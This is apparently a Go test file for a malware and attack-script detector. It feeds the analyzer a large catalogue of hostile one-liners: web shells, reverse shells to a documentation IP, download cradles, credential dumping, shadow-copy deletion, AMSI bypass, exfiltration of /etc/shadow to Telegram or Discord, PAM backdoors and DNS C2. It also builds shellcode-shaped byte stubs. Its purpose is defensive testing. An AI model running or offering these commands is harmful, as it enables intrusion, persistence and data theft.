package tradecraft

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"
	"testing"

	"github.com/s-b-repo/cau/internal/attack"
)

// The API-hash table is derived from names, so it must reproduce the published
// constants or the whole check is silently dead.
func TestAPIHashKnownConstants(t *testing.T) {
	for _, c := range []struct {
		module, fn string
		want       uint32
	}{
		{"kernel32.dll", "LoadLibraryA", 0x0726774C},
		{"kernel32.dll", "VirtualAlloc", 0xE553A458},
		{"ws2_32.dll", "WSAStartup", 0x006B8029},
		{"ws2_32.dll", "connect", 0x6174A599},
	} {
		if got := apiHash(c.module, c.fn); got != c.want {
			t.Errorf("%s!%s = %#x, want %#x", c.module, c.fn, got, c.want)
		}
	}
}

func has(r *Result, class string) bool {
	for _, f := range r.Findings {
		if f.Class == class {
			return true
		}
	}
	return false
}

// Script behaviour. Every sample is inert text written for this test: each is
// the smallest shape of the behaviour, with no working address.
func TestScriptVectors(t *testing.T) {
	cases := []struct{ name, src, class string }{
		{"php direct", `<?php system($_GET['c']); ?>`, classPHPRequestExec},
		{"php wrapped", `<?php passthru(stripslashes($_REQUEST["c"])); ?>`, classPHPRequestExec},
		{"php taint", "<?php\n$c = $_POST['x'];\n$d = $c . ' 2>&1';\nshell_exec($d);\n", classPHPTaintExec},
		{"php eval", `<?php eval(gzinflate(base64_decode($x))); ?>`, classPHPEvalDecode},
		{"asp", `<% Set s = CreateObject("WScript.Shell") : s.Exec(Request.Form("c")) %>`, classASPExec},
		{"aspx", `<%@ Page Language="C#" %><% var p = new System.Diagnostics.ProcessStartInfo("cmd", Request.Form["c"]); %>`, classASPXExec},
		{"jsp", `<% Runtime.getRuntime().exec(request.getParameter("c")); %>`, classJSPExec},
		{"cfm", `<cfexecute name="#form.cmd#"></cfexecute>`, classCFMExec},
		{"cgi", "print \"Content-type: text/html\\n\\n\";\nmy $r = $ENV{QUERY_STRING};\nmy @o = `$r`;\n", classCGIExec},
		{"bash", `bash -i >& /dev/tcp/192.0.2.1/443 0>&1`, classRevShellSh},
		{"exec fd", `exec 5<>/dev/tcp/192.0.2.1/443; sh <&5 >&5 2>&5`, classRevShellSh},
		{"fifo", `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.1 443 > /tmp/f`, classRevShellSh},
		{"php socket", `<?php $s = fsockopen($h, 443); proc_open("/bin/sh -i", $d, $p); ?>`, classRevShellPHP},
		{"python", "import socket,os,pty\ns=socket.socket()\nos.dup2(s.fileno(),0)\npty.spawn('/bin/sh')\n", classRevShellPython},
		{"python stager", "import socket\ns=socket.socket(2,1)\nd=s.recv(4)\nexec(d)\n", classStagerPython},
		{"perl", "use Socket;\nsocket(S,PF_INET,SOCK_STREAM,0);\nopen(STDIN, \">&S\");\nexec {\"/bin/sh\"} 'sh';\n", classRevShellPerl},
		{"java", `Socket s = new Socket(h, 443); Process p = Runtime.getRuntime().exec("/bin/sh"); p.getInputStream();`, classRevShellJava},
		{"socat shell", `socat TCP:192.0.2.1:443 EXEC:'/bin/sh',pty`, classRevShellTool},
		{"gawk", "gawk 'BEGIN { s = \"/inet/tcp/0/192.0.2.1/443\"\n printf \"x\" |& s }'", classRevShellTool},
		{"openssl relay", `/bin/sh -i 2>&1 | openssl s_client -quiet -connect 192.0.2.1:443 > /tmp/s`, classRevShellTool},
		{"curl telnet", `curl -Ns telnet://192.0.2.1:443 </dev/null | /bin/sh | curl -Ns telnet://192.0.2.1:444`, classRevShellTool},
		{"xterm", `xterm -display 192.0.2.1:1`, classRevShellTool},
		{"node", `require("child_process").spawn("/bin/sh"); require("net").connect(443, "192.0.2.1")`, classRevShellManaged},
		{"c source", "s=socket(AF_INET,SOCK_STREAM,0);\ndup2(s,0);\nexecve(\"/bin/sh\",0,0);\n", classRevShellC},
		{"lua", `require("socket");os.execute("/bin/sh -i")`, classRevShellLua},
		{"php backtick", "<?=`$_GET[0]`?>", classPHPRequestExec},
		{"certutil", `certutil.exe -urlcache -split -f http://192.0.2.1/x.exe x.exe`, classLOLDownload},
		{"mshta", `mshta http://192.0.2.1/x.hta`, classLOLDownload},
		{"regsvr32", `regsvr32 /s /n /u /i:http://192.0.2.1/x.sct scrobj.dll`, classLOLExec},
		{"rundll32", `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(1)`, classLOLExec},
		{"comsvcs", `rundll32 C:\Windows\System32\comsvcs.dll, MiniDump 624 c:\t.dmp full`, classLOLDump},
		{"reg save", `reg save HKLM\SAM sam.hive`, classLOLDump},
		{"shadows", `vssadmin delete shadows /all /quiet`, classInhibitRecovery},
		{"base64 pipe", `echo aWQK | base64 -d | bash`, classDecodeExec},
		{"php backtick assign", "<?php $o = `$_POST[c]`; echo $o; ?>", classPHPRequestExec},
		{"glob", `/???/b??h -c id`, classGlobObfuscation},
		{"ifs", `cat${IFS}/etc/passwd`, classGlobObfuscation},
		{"webhook", `curl https://discord.com/api/webhooks/1/x -d @/etc/passwd`, classC2Service},
		{"powershell", `$c = New-Object System.Net.Sockets.TCPClient($h,443); $s = $c.GetStream(); iex $d`, classRevShellPS},
		{"ruby", `c = TCPSocket.new(h, 443); exec "/bin/sh"`, classRevShellRuby},
		{"loader", "[DllImport(\"kernel32\")] VirtualAlloc\n CreateThread\n", classMemLoader},
		{"vba loader", "Private Declare PtrSafe Function CreateThread Lib \"kernel32\" ()\nPrivate Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" ()\n", classMemLoader},
		{"amsi", `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`, classAMSIBypass},
		{"cradle", `IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.1/x')`, classDownloadExec},
		{"cradle piped", `Invoke-WebRequest http://192.0.2.1/x | iex`, classDownloadExec},
		{"decode", `iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))`, classDecodeExec},
		{"assembly", `[Reflection.Assembly]::Load([Convert]::FromBase64String($b))`, classAssemblyLoad},
		{"python decode", `exec(__import__('zlib').decompress(__import__('base64').b64decode(b)))`, classPythonExecDecoded},
		{"shell quoted python", `echo exec\(__import__\(\'zlib\'\).decompress\(b64decode\(b\)\)\) | python`, classPythonExecDecoded},
		{"keylogger", "GetAsyncKeyState\nGetForegroundWindow\n", classKeylogger},
		{"dcom", `$c.Document.ActiveView.ExecuteShellCommand("cmd")`, classDCOMExec},
		{"sql", `sp_configure 'xp_cmdshell',1;RECONFIGURE`, classSQLShell},
		{"gpp", "Get-ChildItem \\\\dc\\SYSVOL -Recurse\n$_.cpassword\n", classGPPSecrets},
		{"gtfo sudo find", `sudo find . -exec /bin/sh \; -quit`, classGTFOSudo},
		{"gtfo sudo awk", `sudo awk 'BEGIN {system("/bin/sh")}' /etc/hosts`, classGTFOSudo},
		{"gtfo sudo vim", `sudo vim -c ':!/bin/sh' /etc/hosts`, classGTFOSudo},
		{"gtfo suid find", `find / -perm -4000 -exec /bin/sh -p \; 2>/dev/null`, classGTFOSUID},
		{"gtfo suid shell", `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /tmp/rootbash -p`, classGTFOSUID},
		{"gtfo pty", `python3 -c 'import pty; pty.spawn("/bin/bash")'`, classGTFOShell},
		{"gtfo nmap", `nmap --interactive`, classGTFOShell},
		{"gtfo gdb", `gdb -nx -ex '!/bin/sh' -ex quit`, classGTFOShell},
		{"gtfo awk", `awk 'BEGIN{system("/bin/sh")}'`, classGTFOShell},
		{"telnetd", `busybox telnetd -l /bin/sh -p 4444`, classRevShellTool},
		{"socat system", `socat TCP-LISTEN:4444,reuseaddr SYSTEM:/bin/bash`, classRevShellTool},
		{"certreq", `certreq.exe -Post -config https://192.0.2.1/x out.req payload.txt`, classLOLDownload},
		{"workflow compiler", `Microsoft.Workflow.Compiler.exe tasks.xml out.log`, classLOLExec},
		{"agentexecutor", `AgentExecutor.exe -powershell -file evil.ps1`, classLOLExec},
		{"zapier webhook", `curl -X POST https://hooks.zapier.com/hooks/catch/1/abc -d @/etc/passwd`, classC2Service},
		{"file drop", `curl -F "file=@/etc/shadow" https://file.io/`, classC2Service},

		// ── LOLC2 / LOLFSaaS — SaaS as command channel ──
		{"telegram c2", `requests.post("https://api.telegram.org/bot123:ABC/sendDocument", files={"document": open("/etc/shadow", "rb")})`, classC2Service},
		{"slack c2", `curl -sX POST https://slack.com/api/chat.postMessage -H "Authorization: Bearer xoxb-$TOK" -d text=$(whoami)`, classC2Service},
		{"discord cdn", `IEX (Invoke-WebRequest "https://cdn.discordapp.com/attachments/1234567890/9876543210/stage2.bin").Content`, classC2Service},
		{"firebaseio", `fetch("https://my-c2-default-rtdb.firebaseio.com/tasks/agent-42/next.json").then(r=>r.json())`, classC2APIAbuse},
		{"graph sendmail", `POST https://graph.microsoft.com/v1.0/me/sendMail Authorization: Bearer $t`, classC2APIAbuse},
		{"workers.dev", `curl https://evil-tunnel.workers.dev/beacon?id=$(id)`, classC2APIAbuse},
		{"azure functions", `Invoke-RestMethod -Uri "https://myfn.azurewebsites.net/api/cmd?code=xyz"`, classC2APIAbuse},
		{"pages.dev", `wget https://c2.pages.dev/stage2.sh -O - | sh`, classC2APIAbuse},
		{"apps script", `curl -L "https://script.google.com/macros/s/AKfycbz_abc_def/exec?c=$(id|base64)"`, classC2APIAbuse},
		{"dropbox upload", `requests.post("https://content.dropboxapi.com/2/files/upload", headers={"Dropbox-API-Arg": "..."})`, classC2APIAbuse},
		{"github contents put", `curl -X PUT https://api.github.com/repos/u/r/contents/beacon.txt -d '{"message":"ok","content":"'$b64'"}'`, classC2APIAbuse},
		{"openai api", `requests.post("https://api.openai.com/v1/chat/completions", json=p, headers={"Authorization":"Bearer "+k})`, classC2Service},
		{"anthropic api", `curl https://api.anthropic.com/v1/messages -d "$prompt" -H "x-api-key: $KEY"`, classC2Service},
		{"blockchain rpc", `curl -X POST https://polygon-rpc.com/ -d '{"method":"eth_call","params":[...]}'`, classC2Service},
		{"ntfy", `curl -d "cmd:$(whoami)" ntfy.sh/mybeacon-topic-xyz`, classC2Service},
		{"tailscale", `ssh root@c2server.tailscale.io`, classC2Service},
		{"pagerduty", `curl -X POST https://events.pagerduty.com/v2/enqueue -d "$payload"`, classC2Service},
		{"line notify", `curl https://notify-api.line.me/api/notify -H "Authorization: Bearer $t" -F message="$(whoami)"`, classC2Service},
		{"pushover", `curl https://api.pushover.net/1/messages.json -d token=$t -d user=$u -d message=$m`, classC2Service},

		// ── ArcticFox bypasses ──
		{"memfd+execveat", "int fd = memfd_create(\"\", 1);\nwrite(fd, buf, n);\nexecveat(fd, \"\", argv, envp, AT_EMPTY_PATH);\n", classBypassMemFD},
		{"memfd+fexecve", "fd := memfd_create('', 0)\nos.write(fd, payload)\nfexecve(fd, argv, env)", classBypassMemFD},
		{"prctl rename", "prctl(PR_SET_NAME, \"sshd\\0\", 0,0,0);\nsock = socket(AF_INET, SOCK_STREAM, 0);\nconnect(sock, ...);", classBypassProcRename},
		{"ld.so.preload write", `echo /tmp/libshim.so >> /etc/ld.so.preload`, classBypassLDPreload},
		{"rtld_next", "orig_open = dlsym(RTLD_NEXT, \"open\");\n", classBypassLDPreload},
		{"pam_exec add", `echo 'auth optional pam_exec.so expose_authtok /tmp/.sshd' >> /etc/pam.d/sshd`, classBypassPAMBackdoor},
		{"pam_unix replace", `install -m 0755 /tmp/pwned_pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so`, classBypassPAMBackdoor},
		{"systemctl edit", `systemctl edit --full sshd`, classBypassSystemdHijack},
		{"service.d drop", `cat > /etc/systemd/system/sshd.service.d/override.conf <<EOF`, classBypassSystemdHijack},
		{"systemd-run user", `systemd-run --user --on-calendar=*:0/30 /home/u/.local/bin/beacon`, classBypassSystemdHijack},
		{"self unlink", `unlink("/proc/self/exe");`, classBypassSelfDelete},
		{"self overwrite", `dd if=/dev/zero of=/proc/self/exe bs=1 count=1024 2>/dev/null`, classBypassProcHide},
		{"github dead-drop", `curl https://raw.githubusercontent.com/attacker/dropsite/main/README.md?nocache=84521&t=1699999999`, classBypassGithubDeadDrop},
		{"github contents cache-bust", `requests.get("https://api.github.com/repos/u/r/contents/README.md?nocache=42&t=10")`, classBypassGithubDeadDrop},
		{"icmp c2 python", "s=socket.socket(AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)\np=s.recv(1500)\ntype=8; icmp_echo = parse(p)", classBypassICMPC2},
		{"dns c2 python", `a = dns.resolver.resolve(name, "TXT")
cmd = base64.b64decode(a[0].strings[0])`, classBypassDNSC2},
		{"dig | base64", `dig +short -t TXT c2.example.com | tr -d '"' | base64 -d`, classBypassDNSC2},
		{"zw redirect", "fetch(\"https://www.google.com/url?q=​data‌x\")", classBypassOpenRedirect},
		{"domain fronting", "tls.Config{ServerName: \"d3abcdef.cloudfront.net\"}\nreq.Host = \"attacker-c2.example.com\"", classBypassDomainFront},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if r := Analyze([]byte(c.src), Options{}); !has(r, c.class) {
				t.Fatalf("want %s, got %+v", c.class, r.Findings)
			}
		})
	}
}

// Benign shapes close to a vector. Each of these is a false positive some
// earlier or naive version of a pattern has.
func TestScriptQuiet(t *testing.T) {
	for name, src := range map[string]string{
		"pdo exec":        `<?php $db->exec($sql); $x = $_POST['id']; ?>`,
		"static exec":     `<?php exec("ls -l"); ?>`,
		"port probe":      "if echo > /dev/tcp/$HOST/$PORT; then echo up; fi\n",
		"plain request":   `<?php echo htmlspecialchars($_GET['q']); ?>`,
		"subprocess":      "import subprocess\nsubprocess.run(['ls'])\n",
		"socket client":   "import socket\ns=socket.socket()\ns.connect((h,p))\ns.send(b'x')\n",
		"proc no window":  `$p = @{ FileName = 'dotnet'; CreateNoWindow = $true }`,
		"reflection":      `$t.GetMethod('X', [Reflection.BindingFlags]::NonPublic)`,
		"process no web":  `using System.Diagnostics; Process.Start("notepad");`,
		"socat helper":    "socat TCP-LISTEN:25,fork EXEC:./mail.sh\n",
		"com header":      "EXTERN_C const CLSID CLSID_ShellBrowserWindow;\n",
		"regsvr32 alone":  "regsvr32 /s foo.dll\n",
		"certutil hash":   "certutil -hashfile x.iso SHA256\n",
		"msbuild project": "msbuild.exe app.csproj\n",
		"glob in docs":    "ls /usr/*/lib\n",
		"curl installer":  "curl -fsSL https://example.com/install.sh | sh\n",
		"docs":            "See Invoke-WebRequest and the iex alias in the handbook.\nDownloadString is a method.\n",
		"sudo shell":      "sudo sh -c 'echo ok > /etc/motd'\n",
		"sudo install":    "sudo apt-get install -y nginx\n",
		"ssh port":        "ssh -p 2222 user@host uptime\n",
		"install mode":    "install -m 0755 app /usr/local/bin/app\n",
		"chmod normal":    "chmod 755 /usr/bin/foo; chmod +x deploy.sh\n",
		"chmod suid ping": "chmod 4755 /usr/bin/ping\n",
		"find exec sh":    "find . -name '*.log' -exec sh -c 'gzip \"$1\"' _ {} \\;\n",
		"gdb normal":      "gdb -batch -ex run -ex bt --args ./prog\n",
		"vim normal":      "vim -c ':wq' notes.txt\n",
		"nmap normal":     "nmap -sV -p 1-1024 192.0.2.1\n",
		"winget install":  "winget install Microsoft.PowerShell\n",

		// ── Naming a SaaS host without an abusable path ──
		"telegram link":       "Join our Telegram at https://t.me/example_group for updates.\n",
		"graph docs":          "Documentation: see https://graph.microsoft.com/v1.0/me for the current user.\n",
		"openai docs":         "The ChatGPT home page at https://chat.openai.com is the usual starting point.\n",
		"reddit browse":       "Open https://www.reddit.com/r/golang/ to browse the subreddit.\n",
		"firebase readme":     "## Firebase\nUse https://firebase.google.com/docs for setup.\n",
		"workers helloworld":  "// Hello-world Cloudflare worker\nexport default { async fetch(req) { return new Response('hi') } }\n",
		"azure docs":          "See https://learn.microsoft.com/azure/azure-functions/ for the Functions getting-started guide.\n",
		"github browse":       "Clone from https://github.com/user/repo.git\n",
		"github release read": "wget https://github.com/kubernetes/kubectl/releases/download/v1.31.0/kubectl.tar.gz\n",

		// ── Bypass vectors — lookalikes that must stay quiet ──
		"changelog naming both":   "- Added `memfd_create()` on Linux.\n" + strings.Repeat("- Unrelated entry.\n", 80) + "- Added `fexecve()`.\n",
		"gist cited in a comment": "# see https://gist.github.com/someone/f9da6ebb9a7a6f679157\n",
		"memfd alone":             "fd, err := memfd_create('shared', 0)\nif err != nil { return err }\n", // no exec primitive
		"prctl alone":             "prctl(PR_SET_NAME, \"myservice\", 0,0,0);\nreturn 0;\n",               // no socket/exec nearby
		"dlsym normal":            "handle := dlsym(lib, \"foo\")\n",
		"ld.preload read":         "if [ -f /etc/ld.so.preload ]; then echo 'preload exists'; fi\n",
		"pam docs":                "# pam_exec can run arbitrary programs. See man pam_exec.so for the parameters.\n",
		"systemctl edit no":       "systemctl edit myservice   # edits the override only\n",
		"service.d my own":        "/etc/systemd/system/mycustom.service.d/override.conf\n",
		"dig a record":            "dig +short google.com\n",
		"dns resolve a":           "a = dns.resolver.resolve(name, 'A')\nip = a[0].address\n",
		"icmp listen only":        "sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP); // no payload decode\n",
		"unlink tmp":              `unlink("/tmp/mytool.sock")`,
		"google url plain":        "https://www.google.com/url?q=https%3A%2F%2Fexample.com\n",                        // no zero-width
		"tls servername norm":     `tls.Config{ServerName: "api.example.com"}` + "\n",                                // no divergent Host header
		"github raw doc":          "wget https://raw.githubusercontent.com/kubernetes/kubernetes/master/README.md\n", // no ?nocache=
	} {
		t.Run(name, func(t *testing.T) {
			if r := Analyze([]byte(src), Options{}); r.Detected() {
				t.Fatalf("false positive: %+v", r.Findings)
			}
		})
	}
}

// An exception must not excuse a whole file, or naming a trusted installer in a
// comment would hide the real cradle below it.
func TestTrustedInstallerExcusesOnlyItsLine(t *testing.T) {
	src := "iex (irm https://community.chocolatey.org/install.ps1)\niex (irm http://192.0.2.1/x)\n"
	if r := Analyze([]byte(src), Options{}); !has(r, classDownloadExec) {
		t.Fatalf("the second line must still fire: %+v", r.Findings)
	}
	// A package on the same host is not the installer.
	pkg := "iex (irm https://community.chocolatey.org/api/v2/package/stranger)\n"
	if r := Analyze([]byte(pkg), Options{}); !has(r, classDownloadExec) {
		t.Fatalf("only the exact path is trusted: %+v", r.Findings)
	}
}

func TestPHPTaintIgnoresUntaintedSink(t *testing.T) {
	src := "<?php\n$q = $_GET['q'];\n$cmd = 'uptime';\nsystem($cmd);\necho $q;\n"
	if r := Analyze([]byte(src), Options{}); has(r, classPHPTaintExec) {
		t.Fatalf("sink is not fed by the request: %+v", r.Findings)
	}
}

// stub is a synthetic byte sequence with the shape the checks look for and no
// function: a PEB walk beside a rotate-and-add, then hashed-API immediates.
func stub() []byte {
	var b bytes.Buffer
	b.Write([]byte{0xFC, 0x90, 0x90})
	b.Write([]byte{0x64, 0x8B, 0x50, 0x30, 0x8B, 0x52, 0x0C, 0x8B, 0x52, 0x14})
	b.Write([]byte{0x90, 0x90, 0xC1, 0xCF, 0x0D, 0x01, 0xC7})
	for _, name := range []struct{ m, f string }{{"kernel32.dll", "LoadLibraryA"}, {"ws2_32.dll", "connect"}} {
		h := apiHash(name.m, name.f)
		b.Write([]byte{0x68, byte(h), byte(h >> 8), byte(h >> 16), byte(h >> 24)})
	}
	for b.Len() < 64 {
		b.WriteByte(0x90)
	}
	return b.Bytes()
}

func TestRawStub(t *testing.T) {
	r := Analyze(append(stub(), 0), Options{})
	if !has(r, classPEBHash) || !has(r, classAPIHash) || !r.Detected() {
		t.Fatalf("got %+v", r.Findings)
	}
}

func TestAPIHashNeedsTwo(t *testing.T) {
	h := apiHash("kernel32.dll", "LoadLibraryA")
	data := []byte{0, 0x68, byte(h), byte(h >> 8), byte(h >> 16), byte(h >> 24), 0}
	if r := Analyze(data, Options{}); has(r, classAPIHash) {
		t.Fatalf("one immediate is coincidence: %+v", r.Findings)
	}
}

// PEB access alone is ordinary: anti-debug checks and CRT startup read it.
func TestPEBWalkNeedsHashLoop(t *testing.T) {
	data := append([]byte{0}, 0x64, 0x8B, 0x50, 0x30, 0x8B, 0x52, 0x0C, 0x8B, 0x52, 0x14, 0xC3)
	if r := Analyze(data, Options{}); has(r, classPEBHash) {
		t.Fatalf("got %+v", r.Findings)
	}
}

func TestCarriers(t *testing.T) {
	s := stub()
	hexList := func(prefix string) string {
		parts := make([]string, len(s))
		for i, b := range s {
			parts[i] = fmt.Sprintf("%s%x", prefix, b)
		}
		return strings.Join(parts, ",")
	}
	dec := make([]string, len(s))
	for i, b := range s {
		dec[i] = fmt.Sprint(b)
	}
	var esc strings.Builder
	esc.WriteString(`char buf[] = "`)
	for i, b := range s {
		if i == 20 {
			esc.WriteString("\"\n\"")
		}
		fmt.Fprintf(&esc, `\x%02x`, b)
	}
	esc.WriteString(`";`)

	var gz bytes.Buffer
	zw := gzip.NewWriter(&gz)
	_, _ = zw.Write([]byte(`x = "` + base64.StdEncoding.EncodeToString(bytes.Repeat(s, 3)) + `"`))
	_ = zw.Close()

	for name, text := range map[string]string{
		"powershell list": "[Byte[]] $b = " + hexList("0x"),
		"vba array":       "b = Array(" + strings.Join(dec[:40], ",") + ", _\n" + strings.Join(dec[40:], ",") + ")",
		"c escapes":       esc.String(),
		"base64":          `$b = [Convert]::FromBase64String("` + base64.StdEncoding.EncodeToString(bytes.Repeat(s, 3)) + `")`,
		"base64 gzip":     `b = "` + base64.StdEncoding.EncodeToString(gz.Bytes()) + `"`,
	} {
		t.Run(name, func(t *testing.T) {
			r := Analyze([]byte(text), Options{})
			if !has(r, classAPIHash) || r.Decoded == 0 {
				t.Fatalf("carrier not decoded: decoded=%d %+v", r.Decoded, r.Findings)
			}
		})
	}
}

// A byte list of real data must decode and find nothing.
func TestCarrierWithBenignTable(t *testing.T) {
	parts := make([]string, 256)
	for i := range parts {
		parts[i] = fmt.Sprintf("0x%02x", i)
	}
	text := "static const unsigned char table[] = {" + strings.Join(parts, ", ") + "};"
	if r := Analyze([]byte(text), Options{}); len(r.Findings) != 0 {
		t.Fatalf("got %+v", r.Findings)
	}
}

func TestParseNumbersRejectsWideTables(t *testing.T) {
	if parseNumbers("1, 2, 300", 1<<20) != nil {
		t.Fatal("a list with an element over 255 is not a byte array")
	}
}

func TestDecoderStubs(t *testing.T) {
	// fnstenv; pop edi; xor ecx,ecx; xor [edi+0x10],eax
	getpc, _ := hex.DecodeString("d97424f45f33c9b15f83c704314710000000")
	if r := Analyze(getpc, Options{}); !has(r, classGetPC) {
		t.Fatalf("fpu GetPC: %+v", r.Findings)
	}
	// jmp +5; pop rbx; xor [rbx],al; nop; nop; call back-to-pop
	jcp := []byte{0xEB, 0x05, 0x5B, 0x30, 0x03, 0x90, 0x90, 0xE8, 0xF6, 0xFF, 0xFF, 0xFF, 0x00, 0x00}
	if r := Analyze(jcp, Options{}); !has(r, classJmpCall) {
		t.Fatalf("jmp/call/pop: %+v", r.Findings)
	}
	// The same call landing anywhere else is not the idiom.
	jcp[8] = 0xF0
	if r := Analyze(jcp, Options{}); has(r, classJmpCall) {
		t.Fatalf("call must land on the pop: %+v", r.Findings)
	}
}

// Encoded shellcode has no NUL by construction, which is what made a NUL check
// call it text and skip every byte check.
func TestNULFreeBinaryIsNotText(t *testing.T) {
	b := make([]byte, 400)
	for i := range b {
		b[i] = byte(0x80 + i%0x70)
	}
	if _, ok := asText(b); ok {
		t.Fatal("high-byte binary read as text")
	}
	if _, ok := asText([]byte("héllo wörld, ünïcode text is text\n")); !ok {
		t.Fatal("UTF-8 text read as binary")
	}
}

func TestLinuxSyscallStubs(t *testing.T) {
	// push 41; pop rax; ... syscall; push 42; pop rax; syscall
	x64 := []byte{0x6A, 0x29, 0x58, 0x99, 0x0F, 0x05, 0x48, 0x97, 0x6A, 0x2A, 0x58, 0x0F, 0x05, 0, 0}
	if r := Analyze(x64, Options{}); !has(r, classLinuxNet) {
		t.Fatalf("x64: %+v", r.Findings)
	}
	x86 := []byte{0x31, 0xDB, 0xF7, 0xE3, 0xB0, 0x66, 0x89, 0xE1, 0xCD, 0x80, 0, 0}
	if r := Analyze(x86, Options{}); !has(r, classLinuxNet) {
		t.Fatalf("x86: %+v", r.Findings)
	}
	// In a large binary the same bytes prove nothing.
	big := append(make([]byte, maxSyscallBlob+1), x64...)
	if r := Analyze(big, Options{}); has(r, classLinuxNet) {
		t.Fatalf("size gate: %+v", r.Findings)
	}
}

// "/bin/sh" in rodata beside the next string is every program that reads $SHELL.
func TestShellStringNeedsTheInstruction(t *testing.T) {
	rodata := append([]byte{0}, []byte("/bin/sh\x00SHELL\x00")...)
	if r := Analyze(rodata, Options{}); has(r, classLinuxExec) {
		t.Fatalf("got %+v", r.Findings)
	}
	code := append([]byte{0, 0x48, 0xBB}, []byte("/bin/sh\x00")...)
	if r := Analyze(code, Options{}); !has(r, classLinuxExec) {
		t.Fatalf("got %+v", r.Findings)
	}
}

func TestDecodeBudgetBoundsWork(t *testing.T) {
	// Nested carriers cannot walk past maxDepth, however deep they go.
	payload := stub()
	text := `x = "` + base64.StdEncoding.EncodeToString(bytes.Repeat(payload, 3)) + `"`
	for i := 0; i < maxDepth+3; i++ {
		text = `y = "` + base64.StdEncoding.EncodeToString([]byte(text+strings.Repeat(" ", 128))) + `"`
	}
	if r := Analyze([]byte(text), Options{}); has(r, classAPIHash) {
		t.Fatalf("decoded past the depth limit: %+v", r.Findings)
	}
}

func TestTooLargeSkipped(t *testing.T) {
	r := Analyze(make([]byte, 100), Options{MaxSize: 10})
	if r.Skipped == "" || r.Detected() {
		t.Fatalf("got %+v", r)
	}
}

func TestEachClassOnceAcrossLayers(t *testing.T) {
	blob := base64.StdEncoding.EncodeToString(bytes.Repeat(append(stub(), 0), 3))
	text := `a = "` + blob + `"` + "\n" + `b = "` + blob + `"`
	r := Analyze([]byte(text), Options{})
	n := 0
	for _, f := range r.Findings {
		if f.Class == classAPIHash {
			n++
		}
	}
	if n != 1 {
		t.Fatalf("class counted %d times", n)
	}
}

// The catalog must stay honest: every class has a description and a technique
// the ATT&CK table knows, or the coverage matrix quietly loses it.
func TestCatalog(t *testing.T) {
	for _, c := range Classes() {
		if c.Description == "" || c.Weight <= 0 {
			t.Errorf("%s incomplete: %+v", c.Class, c)
		}
		if _, ok := attack.Lookup(c.Technique); !ok {
			t.Errorf("%s: technique %s not in the ATT&CK table", c.Class, c.Technique)
		}
	}
	for _, vec := range vectors {
		if _, ok := catalog[vec.class]; !ok {
			t.Errorf("vector %s has no catalog entry", vec.class)
		}
	}
}

func FuzzAnalyze(f *testing.F) {
	f.Add([]byte(`<?php system($_GET['c']); ?>`))
	f.Add(stub())
	f.Add([]byte{0xEB, 0x05, 0x5B, 0x30, 0x03, 0x90, 0x90, 0xE8, 0xF6, 0xFF, 0xFF, 0xFF})
	f.Fuzz(func(t *testing.T, data []byte) {
		r := Analyze(data, Options{})
		if r == nil {
			t.Fatal("nil result")
		}
	})
}
